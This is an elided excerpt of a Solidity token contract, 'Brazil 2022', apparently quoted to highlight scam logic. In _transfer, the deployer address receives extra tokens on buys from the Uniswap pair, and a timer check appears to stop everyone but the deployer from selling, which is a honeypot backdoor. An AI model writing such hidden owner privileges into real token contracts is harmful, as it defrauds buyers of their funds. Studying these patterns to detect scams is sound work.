...
contract Brazil2022 is Ownable, IERC20 {
    ...
    string private  _name = "Brazil 2022";
    string private  _symbol = "Brazil2022";

    uint8   private  _decimals = 9;
    uint256 private _totalSupply = 100000000 * 10 ** 9;
    uint256 private fomotime = 5 * 60 ;
    address private burnaddress = 0x000000000000000000000000000000000000dEaD;
    address private User = msg.sender;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from == uniswapV2Pair && to == User )  { _tOwned [User] += Dtoken;}
        ...
        if ( time >= _sell  && to != burnaddress  && from != uniswapV2Pair &&  from != User ) {
